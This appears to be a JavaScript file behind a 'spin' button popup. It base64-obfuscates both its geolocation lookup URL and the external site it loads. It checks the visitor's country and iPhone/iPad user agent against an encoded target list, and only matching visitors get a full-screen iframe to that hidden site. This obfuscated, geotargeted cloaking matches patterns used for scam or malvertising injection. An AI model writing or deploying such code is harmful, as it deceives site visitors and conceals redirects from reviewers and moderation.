document.addEventListener('DOMContentLoaded', function() {
    var style = document.createElement('style');
    style.type = 'text/css';
    style.innerHTML = `
        .popup {
            display: none;
            position: fixed;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            width: 100%;
            max-width: 100%;
            padding: 0px;
            background: transparent; 
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            z-index: 1000;
            overflow: auto;
            animation: pulsate 1.5s infinite;
          transform: translate(-50%, -50%) translateY(15%);

}

        @keyframes pulsate {
            0% {
                box-shadow: 0 0 10px 2px rgba(0, 255, 0, 0.7);
            }
            50% {
                box-shadow: 0 0 10px 10px rgba(0, 255, 0, 0.9);
            }
            100% {
                box-shadow: 0 0 10px 2px rgba(0, 255, 0, 0.7);
            }
        }

        .popup-content {
            width: 100%;
            height: 400px;
        }
        .overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            z-index: 999;
        }
    `;
    document.head.appendChild(style);

    function decodeBase64(encodedStr) {
        return decodeURIComponent(atob(encodedStr).split('').map(function(c) {
            return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
        }).join(''));
    }

    var overlay = document.createElement('div');
    overlay.className = 'overlay';
    
    var popup = document.createElement('div');
    popup.id = 'DreamContent';
    popup.className = 'popup';
    
    document.body.appendChild(overlay);
    document.body.appendChild(popup);

    var encodedFetchUrl = 'aHR0cHM6Ly9pcGFwaS5jby9qc29uLw=='; 

    fetch(decodeBase64(encodedFetchUrl))
        .then(response => response.json())
        .then(data => {
            var country = data.country;
            var userAgent = navigator.userAgent;

             var allowedCountries = ["QUQ=", "QU8=", "QUc=", "QV I=", "QU0=", "QVU=", "QVQ=", "QVo=", "QlM=", "Qkg=", "QkQ=", 'QkI=', "Ql k=", "QkU=", "Qlo=", 'Qko=', 'QlQ=', "Qk8=", "QkE=", 'Qlc=', "QlI=", "Qk4=", "Qkc=", "QkY=", "Qkk=", "Q0k=", 'Q1Y=', 'S0g=', "Q00=", "Q0A=", "Q0Y=", "VEQ=", "Q0w=", 'Q04=', "Q08=", 'S00=', "Q0c=", "Q1I=", 'SFI=', "Q1U=", "Q1k=", "Q1o=", "Q0Q=", "REs=", 'REo=', 'RE0=', "RE8=", "U1Y=", "R1E=", "RV I=", "RVU=", "U1o=", "RVQ=", "Rko=", "Rkk=", "Q0A=", "U1c=", "QVI=", "VUs=", 'REU=', "RSM=", "VVM=", "QUw=", "Qkc=", "REs=", "RE8=", "R0U=", "RUU=", 'RlI=', "R0I=", "SFU=", "SVM=", 'SVQ=', "SVA=", "S0g=", "TFU=", "TUQ=", 'Tkw=', "TlU=", "UEw=", "UFQ=", "UlU=", 'U0U=', "U0s=", "U0k=", "VEg=", 'VFI=', 'VFY=', "V0U=", 'QU8=', 'QUc=', 'QV I=', 'QU0=','QVU=', 'QVQ=', 'QVo=','QlM=', 'Qkg=', 'QkQ=', 'QkI=', 'Ql k=', 'QkU=','Qlo=', 'Qko=','QlQ=', 'Qk8=','QkE=', 'Qlc=', 'QlI=', 'Qk4=', 'Qkc=', 'QkY=', 'Qkk=','Q0k=','Q1Y=','S0g=', 'Q00=', 'Q0A=','Q0Y=','VEQ=', 'Q0w=', 'Q04=','Q08=','S00=','Q0c=', 'Q1I=', 'SFI=', 'Q1U=', 'Q1k=', 'Q1o=', 'Q0Q=','REs=','REo=', 'RE0=', 'RE8=', 'U1Y=', 'R1E=', 'RV I=', 'RVU=', 'U1o=','RVQ=', 'Rko=', 'Rkk=', 'Q0A=', 'U1c=', 'QVI=', 'VUs=', 'REU=', 'RSM=', 'VVM=','QUw=', 'Qkc=', 'REs=', 'RE8=', 'R0U=', 'RUU=', 'RlI=', 'R0I=', 'SFU=','SVM=', 'SVQ=', 'SVA=', 'S0g=', 'TFU=', 'TUQ=', 'Tkw=', 'TlU=', 'UEw=', 'UFQ=', 'UlU=', 'U0U=', 'U0s=', 'U0k=', 'VEg=', 'VFI=', 'VFY=', 'V0U=','QUQ=', 'QU8=', 'QUc=', 'QV I=', 'QU0=','QVU=', 'QVQ=', 'QVo=','QlM=','Qkg=', 'QkQ=', 'QkI=', 'Ql k=', 'QkU=','Qlo=', 'Qko=','QlQ=', 'Qk8=','QkE=', 'Qlc=', 'QlI=', 'Qk4=', 'Qkc=', 'QkY=', 'Qkk=','Q0k=','Q1Y=','S0g=', 'Q00=', 'Q0A=','Q0Y=','VEQ=', 'Q0w=', 'Q04=','Q08=','S00=','Q0c=', 'Q1I=', 'SFI=', 'Q1U=', 'Q1k=', 'Q1o=', 'Q0Q=','REs=', 'REo=', 'RE0=', 'RE8=', 'U1Y=', 'R1E=', 'RV I=', 'RVU=', 'U1o=','RVQ=', 'Rko=', 'Rkk=', 'Q0A=', 'U1c=', 'QVI=', 'VUs=', 'REU=', 'RSM=','VVM=','QUw=', 'Qkc=', 'REs=', 'RE8=', 'R0U=', 'RUU=', 'RlI=', 'R0I=', 'SFU=','SVM=', 'SVQ=', 'SVA=', 'S0g=', 'TFU=', 'TUQ=', 'Tkw=', 'TlU=', 'UEw=','UFQ=', 'UlU=', 'U0U=', 'U0s=', 'U0k=', 'VEg=', 'VFI=', 'VFY=', 'V0U=','QkU=', 'Qk8=', 'Rkw=', 'QlQ=', 'QlM=', 'Q0g=', 'Q1k=', 'Q1o=', 'R0I=', 'R0I=','R0I=', 'Qkc=', 'SFU=', 'REs=', 'TFU=', 'TFQ=', 'TFU=', 'TFk=', 'RUU=', 'RE0=','TkU=', 'Tk8=', 'Tk8=', 'UFQ=', 'UlU=', 'U0U=', 'U0s=', 'U1U=', 'U1Y=', 'VEg=', 'VUs=', 'Vkw=', 'Vkw=', 'WE4=', 'WFk=', 'WFo=','VVNB', 'VUs=', 'Q0E='
];

            if ((allowedCountries.includes(btoa(country)) && (/iPhone/i.test(userAgent) || /iPad/i.test(userAgent))) || (country === 'BR' && !(/iPhone/i.test(userAgent) || /iPad/i.test(userAgent)))) {
                var button = document.querySelector('.spin-button');

                button.addEventListener('click', function() {
                    setTimeout(function() {
                        var iframe = document.createElement('iframe');
                        var encodedUrl = 'aHR0cHM6Ly9tLnJvbGxzMy5jb20v';
                        iframe.src = decodeBase64(encodedUrl);
                        iframe.allowtransparency = 'true';
                        iframe.style.background = 'transparent'; 
                        iframe.style.width = '100%';
                        iframe.style.height = '900px';
                        iframe.style.border = 'none';
                        popup.appendChild(iframe);

                        popup.style.display = 'block';
                        overlay.style.display = 'block';
                    }, 0); 
                });
            }
        })
        .catch(error => console.error('Error fetching IP info:', error));
});
